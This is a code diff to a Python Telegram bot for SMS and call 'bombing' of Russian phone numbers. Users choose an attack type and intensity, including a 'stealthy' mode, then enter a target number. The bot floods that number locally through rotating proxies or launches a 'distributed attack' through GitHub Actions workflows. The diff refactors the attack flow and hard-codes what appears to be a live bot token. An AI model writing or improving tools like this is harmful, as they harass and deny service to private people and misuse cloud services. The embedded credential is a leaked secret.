@@ -3,9 +3,7 @@ import logging
 import re
 import time
 import os
-import sys
-import json
-from datetime import datetime, timedelta
+import aiohttp
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
     Application,
@@ -19,15 +17,15 @@ from telegram.ext import (
 from apscheduler.schedulers.asyncio import AsyncIOScheduler
 from apscheduler.triggers.interval import IntervalTrigger
 import pytz
-from .bomber import HighVelocityBomber, ProxyManager
-from proxy_manager import ProxyManager as GlobalProxyManager
+from bomber import HighVelocityBomber
+from proxy_manager import ProxyManager
 
 # Configuration
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8179350031:AAF71X8FZF-C4mP0HEYiMezSURxBi2di0dw")
 ADMIN_ID = int(os.getenv("ADMIN_ID", "00000000"))
 GH_TOKEN = os.getenv("GH_TOKEN")
 BOMB_SESSIONS = {}
-PROXY_MANAGER = GlobalProxyManager()
+PROXY_MANAGER = ProxyManager()  # Global proxy manager instance
 
 # Conversation states
 SELECT_TYPE, SELECT_INTENSITY, ENTER_PHONE = range(3)
@@ -39,16 +37,14 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-# GitHub Actions config
+# GitHub Actions config (REPLACE WITH YOUR VALUES)
 REPO_OWNER = "your_github_username"
 REPO_NAME = "your_repository_name"
 WORKFLOW_ID = "bomber.yml"
 
-
 def is_russian_phone(phone: str) -> bool:
     """Validate Russian phone number format"""
     return re.match(r'^\+7\d{10}$', phone) is not None
-
 
 def format_phone(phone: str) -> str:
     """Format phone number to Russian standard"""
@@ -60,7 +56,6 @@ def format_phone(phone: str) -> str:
     if len(digits) == 10:
         return '+7' + digits
     return '+' + digits
-
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Start command handler"""
@@ -82,7 +77,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
         "Выберите тип атаки:",
         reply_markup=InlineKeyboardMarkup(keyboard))
     return SELECT_TYPE
-
 
 async def select_type(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Handle attack type selection"""
@@ -109,7 +103,6 @@ async def select_type(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int
         reply_markup=InlineKeyboardMarkup(keyboard))
     return SELECT_INTENSITY
 
-
 async def start_cloud_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Start distributed attack via GitHub Actions"""
     query = update.callback_query
@@ -119,7 +112,6 @@ async def start_cloud_attack(update: Update, context: ContextTypes.DEFAULT_TYPE)
         text="📱 Введите российский номер телефона в формате +7XXXXXXXXXX:")
     context.user_data['cloud'] = True
     return ENTER_PHONE
-
 
 async def select_intensity(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Handle intensity selection"""
@@ -133,11 +125,11 @@ async def select_intensity(update: Update, context: ContextTypes.DEFAULT_TYPE) -
         text="📱 Введите российский номер телефона в формате +7XXXXXXXXXX:")
     return ENTER_PHONE
 
-
 async def enter_phone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Handle phone number input"""
     phone = format_phone(update.message.text)
     user = update.message.from_user
+    chat_id = update.effective_chat.id
 
     if not is_russian_phone(phone):
         await update.message.reply_text("❌ Неверный формат номера! Используйте формат +7XXXXXXXXXX")
@@ -145,7 +137,7 @@ async def enter_phone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int
 
     # Cloud attack
     if context.user_data.get('cloud'):
-        await trigger_github_action(phone, context, user.id)
+        await trigger_github_action(phone, context, user.id, chat_id)
         return ConversationHandler.END
 
     # Local attack
@@ -154,7 +146,7 @@ async def enter_phone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int
             phone=phone,
             bomb_type=context.user_data['type'],
             intensity=context.user_data['intensity'],
-            chat_id=update.message.chat_id,
+            chat_id=chat_id,
             proxy_manager=PROXY_MANAGER
         )
     except Exception as e:
@@ -180,9 +172,14 @@ async def enter_phone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int
 
     return ConversationHandler.END
 
-
-async def trigger_github_action(phone: str, context: ContextTypes.DEFAULT_TYPE, user_id: int):
+async def trigger_github_action(phone: str, context: ContextTypes.DEFAULT_TYPE, user_id: int, chat_id: int):
     """Trigger GitHub Actions workflow"""
+    if not GH_TOKEN:
+        await context.bot.send_message(
+            chat_id=chat_id,
+            text="❌ GitHub token not configured! Cloud attack disabled.")
+        return
+
     headers = {
         "Accept": "application/vnd.github+json",
         "Authorization": f"Bearer {GH_TOKEN}",
@@ -193,7 +190,7 @@ async def trigger_github_action(phone: str, context: ContextTypes.DEFAULT_TYPE, 
         "ref": "main",
         "inputs": {
             "phone": phone,
-            "chat_id": str(context._chat_id),
+            "chat_id": str(chat_id),
             "user_id": str(user_id)
         }
     }
@@ -205,21 +202,20 @@ async def trigger_github_action(phone: str, context: ContextTypes.DEFAULT_TYPE, 
             async with session.post(url, headers=headers, json=payload) as response:
                 if response.status == 204:
                     await context.bot.send_message(
-                        chat_id=context._chat_id,
+                        chat_id=chat_id,
                         text=f"☁️ Запуск распределённой атаки на {phone}!\n"
                              "⚡ Рабочие процессы запускаются на GitHub...")
                 else:
                     error = await response.text()
                     logger.error(f"GitHub API error: {response.status} - {error}")
                     await context.bot.send_message(
-                        chat_id=context._chat_id,
+                        chat_id=chat_id,
                         text="❌ Ошибка запуска cloud attack! Попробуйте позже.")
         except Exception as e:
             logger.error(f"GitHub request failed: {e}")
             await context.bot.send_message(
-                chat_id=context._chat_id,
+                chat_id=chat_id,
                 text="❌ Ошибка подключения к GitHub! Попробуйте позже.")
-
 
 async def run_bombing(user_id, bomb_session, context):
     """Run bombing and update status"""
@@ -287,7 +283,6 @@ async def run_bombing(user_id, bomb_session, context):
     if user_id in BOMB_SESSIONS:
         del BOMB_SESSIONS[user_id]
 
-
 def get_intensity_name(intensity: str) -> str:
     """Get intensity display name"""
     names = {
@@ -296,7 +291,6 @@ def get_intensity_name(intensity: str) -> str:
         "low": "Скрытная"
     }
     return names.get(intensity, "Неизвестно")
-
 
 async def stop_bombing(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Stop active bombing session"""
@@ -311,18 +305,15 @@ async def stop_bombing(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception as e:
         logger.error(f"Error stopping bombing: {e}")
 
-
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Cancel conversation"""
     await update.message.reply_text("Операция отменена.")
     return ConversationHandler.END
 
-
 async def update_proxies():
     """Periodic proxy update"""
     logger.info("Updating proxy list...")
     await PROXY_MANAGER.fetch_proxies()
-
 
 def main() -> None:
     """Start the bot"""
@@ -354,7 +345,6 @@ def main() -> None:
     application.add_handler(CallbackQueryHandler(stop_bombing, pattern=r"^stop_\d+$"))
 
     application.run_polling()
-
 
 if __name__ == "__main__":
     main()
